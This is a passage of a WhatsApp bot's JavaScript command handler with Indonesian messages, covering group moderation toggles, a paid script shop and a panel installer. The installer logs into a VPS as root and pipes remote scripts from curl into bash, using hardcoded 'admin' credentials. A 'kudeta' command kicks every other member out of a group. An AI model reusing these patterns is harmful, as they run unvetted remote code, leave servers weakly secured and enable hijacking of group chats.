var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await TamaMods.sendAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
            
            case 'opentime': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return Reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
Reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
TamaMods.groupSettingUpdate(m.chat, 'not_announcement')
Reply(open)
}, timer)
}
break
//------(Batas Case)------//
case 'closetime': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return Reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
Reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
TamaMods.groupSettingUpdate(m.chat, 'announcement')
Reply(close)
}, timer)
}
break
//------(Batas Case)------//
case "installtema": case "installthema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return Reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
await TamaMods.sendMessage(m.chat, {
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Thema Yang Tersedia',
          sections: [
            {
              title: 'List Thema',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'install thema enigma',
                  id: `.installtemaenigma ${text}`
                },
                {
                  title: 'install thema nebula',
                  id: `.installtemanebula ${text}`
                },
                {
                  title: 'install depend',
                  id: `.installdepend ${text}`
                },
                {
                  title: 'install thema elysium',
                  id: `.installtemaelysium ${text}`
                },               
                {
                  title: 'install thema billing',
                  id: `.installtemabilling ${text}`
                },                
                {
                  title: 'install thema nightcore',
                  id: `.installtemanightcore ${text}`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Kalau mau install thema nebula, install depend terlebih dahulu"
})
}
break



case "installpanel2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return Reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `sudo apt-get remove --purge mysql* -y`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"https://${domainpanel}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"admin\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${passwordPanel}\"}`
}]
})
})} 
}}, {userJid: m.chat, quoted: pantek})
await TamaMods.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('SG\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By TamaMods\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By TamaMods\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await Reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  



case "buyscript": case "buysc": {
if (m.isGroup) return Reply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Simple Bot V2 Gen 2', 
                  description: "Rp50.000", 
                  id: '.buysc 1'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${global.botname2}\nAuto Order Script`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./System/media/script1.zip"
    Obj.harga = "50000"
    Obj.namaSc = "Script Finix Ryc"
    } else if (tek == "2") {
    Obj.file = "./System/media/script2.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Simple Bot V2"  
    } else if (tek == "3") {
    Obj.file = "./System/media/script3.zip"
    Obj.harga = "20000"
    Obj.namaSc = "Script Pushkontak Simpel"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)
const teks3 = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Script`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await TamaMods.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: pantek})
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break


case "kudetagc2": case "kudeta2": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
const anuan = "\nApakah Kamu Yakin Ingin Kudeta Grup Ini ?\n\nKlik Tombol *Yes* Untuk Melanjutkan\nKlik Tombol *No* Untuk Membatalkan"
global.statusKudeta = true
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: anuan
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"title\":\"Yes\",\"id\":\".kudetagc_respon yes\"}" 
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"title\":\"No\",\"id\":\".kudetagc_respon no\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek}) 
await TamaMods.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//================================================================================

case "kudetagc_respon": {
if (!isCreator) return
if (global.statusKudeta == undefined) return
delete global.statusKudeta
if (text == "yes") {
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return Reply("Grup Ini Sudah Tidak Ada Member!")
await Reply("Kudeta Grup By TamaMods Starting 🔥")
for (let i of memberFilter) {
await TamaMods.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await Reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
} else {
return Reply("Kudeta Grup Berhasil Dibatalkan")
}
}
break





case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return Reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return Reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return Reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return Reply("Berhasil mematikan *antilink* di grup ini")
} else return Reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return Reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return Reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return Reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return Reply("Berhasil mematikan *antilink2* di grup ini")
} else return Reply(example("on/off"))
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return Reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return Reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return Reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return Reply("Berhasil mematikan *mute* di grup ini")
} else return Reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return Reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return Reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return Reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return Reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return Reply(example("on/off"))
}
break
  


case "getfile": {
if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply("Silakan masukkan nama file!");

    const sendFile = (file) => {
        try {
            const filePath = `./${file}`;
            if (!fs.existsSync(filePath)) return `File *${file}* tidak ditemukan.`;

            return filePath; // Mengembalikan path file jika ditemukan
        } catch (err) {
            return `Terjadi kesalahan: ${err.message}`;
        }
    };

    try {
        const filePath = sendFile(text);
        if (filePath.startsWith("File") || filePath.startsWith("Terjadi")) {
            return Reply(filePath); // Pesan kesalahan jika file tidak ditemukan
        }

        // Kirim file sebagai lampiran
        TamaMods.sendMessage(
            m.chat,
            { document: { url: filePath }, mimetype: "application/octet-stream", fileName: text },
            { quoted: pantek }
        );
    } catch (e) {
        return Reply(`Terjadi kesalahan: ${e.message}`);
    }
}
break;

case "antitoxic": {
if (!isCreator) return Reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Anti Toxic :* ${db.settings.antitoxic ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Anti Toxic",
rows: [
{ title: "Aktifkan Anti Toxic", id: ".antitoxic on" }, 
{ title: "Matikan Anti Toxic", id: ".antitoxic off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek}) 
await TamaMods.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.antitoxic == true) return Reply("*Anti toxic* sudah aktif")
global.db.settings.antitoxic = true
await Reply("*Anti toxic* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.antitoxic == false) return Reply("*Anti toxic* sudah tidak aktif")
global.db.settings.antitoxic = false
await Reply("*Anti toxic* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break
//------(Batas Case)------//
case "antilinkall": {
if (!isCreator) return Reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Anti Link all :* ${db.settings.antilinkall ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Anti Link all",
rows: [
{ title: "Aktifkan Anti Link all", id: ".antilinkall on" }, 
{ title: "Matikan Anti Link all", id: ".antilinkall off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek}) 
await TamaMods.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.antilinkall == true) return Reply("*Anti Link all* sudah aktif")
global.db.settings.antilinkall = true
await Reply("*Anti Link All* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.antilinkall == false) return Reply("*Anti Link All* sudah tidak aktif")
global.db.settings.antilinkall = false
await Reply("*Anti Link All* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break
//------(Batas Case)------//
case "antilinkwa": {
if (!isCreator) return Reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Anti Badword :* ${db.settings.antilinkwa ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Anti Badword",
rows: [
{ title: "Aktifkan Anti Badword", id: ".antilinkwa on" }, 
{ title: "Matikan Anti Badword", id: ".antilinkwa off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek}) 
await TamaMods.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.antilinkwa == true) return Reply("*Anti Badword* sudah aktif")
global.db.settings.antilinkwa = true
await Reply("*Anti Badword* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.antilinkwa == false) return Reply("*Anti Badword* sudah tidak aktif")
global.db.settings.antilinkwa = false
await Reply("*Anti Badword* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break
//------(Batas Case)------//
case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Autoread :* ${db.settings.autoread ? "✅" : "❌"}
* *Autoread Sw :* ${db.settings.readsw ? "✅" : "❌"}
* *Auto Typing :* ${db.settings.autotyping ? "✅" : "❌"}
* *Auto Promosi :* ${db.settings.autopromosi ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Autoread",
rows: [
{ title: "Aktifkan Autoread", id: ".autoread on" }, 
{ title: "Matikan Autoread", id: ".autoread off" }
]
}, 
{
title: "- Pilih Option Autoread Sw",
rows: [
{ title: "Aktifkan Autoread Sw", id: ".autoreadsw on" }, 
{ title: "Matikan Autoread Sw", id: ".autoreadsw off" }
]
}, 
{
title: "- Pilih Option Auto Typing",
rows: [
{ title: "Aktifkan Auto Typing", id: ".autotyping on" }, 
{ title: "Matikan Auto Typing", id: ".autotyping off" }
]
}, 
{
title: "- Pilih Option Auto Promosi",
rows: [
{ title: "Aktifkan Auto Promosi", id: ".autopromosi on" }, 
{ title: "Matikan Auto Promosi", id: ".autopromosi off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek}) 
await TamaMods.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.autopromosi == true) return Reply("*Auto promosi* sudah aktif")
global.db.settings.autopromosi = true
await Reply("*Auto promosi* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.autopromosi == false) return Reply("*Auto promosi* sudah tidak aktif")
global.db.settings.autopromosi = false
await Reply("*Auto promosi* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break

//================================================================================

case "otomatisauto": {
if (!isCreator) return Reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Autoread :* ${db.settings.autoread ? "✅" : "❌"}
* *Autoread Sw :* ${db.settings.readsw ? "✅" : "❌"}
* *Auto Typing :* ${db.settings.autotyping ? "✅" : "❌"}
* *Auto Promosi :* ${db.settings.autopromosi ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Autoread",
rows: [
{ title: "Aktifkan Autoread", id: ".autoread on" }, 
{ title: "Matikan Autoread", id: ".autoread off" }
]
}, 
{
title: "- Pilih Option Autoread Sw",
rows: [
{ title: "Aktifkan Autoread Sw", id: ".autoreadsw on" }, 
{ title: "Matikan Autoread Sw", id: ".autoreadsw off" }
]
}, 
{
title: "- Pilih Option Auto Ai",
rows: [
{ title: "Aktifkan Auto Ai", id: ".autoai on" }, 
{ title: "Matikan Auto Ai", id: ".autoai off" }
]
}, 
{
title: "- Pilih Option Auto Typing",
rows: [
{ title: "Aktifkan Auto Typing", id: ".autotyping on" }, 
{ title: "Matikan Auto Typing", id: ".autotyping off" }
]
}, 
{
title: "- Pilih Option Auto Promosi",
rows: [
{ title: "Aktifkan Auto Promosi", id: ".autopromosi on" }, 
{ title: "Matikan Auto Promosi", id: ".autopromosi off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek}) 
await TamaMods.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.autoread == true) return Reply("*Autoread* sudah aktif")
global.db.settings.autoread = true
await Reply("*Autoread* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.autoread == false) return Reply("*Autoread* sudah tidak aktif")
global.db.settings.autoread = false
await Reply("*Autoread* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break

//================================================================================

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Autoread :* ${db.settings.autoread ? "✅" : "❌"}
* *Autoread Sw :* ${db.settings.readsw ? "✅" : "❌"}
* *Auto Typing :* ${db.settings.autotyping ? "✅" : "❌"}
* *Auto Promosi :* ${db.settings.autopromosi ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
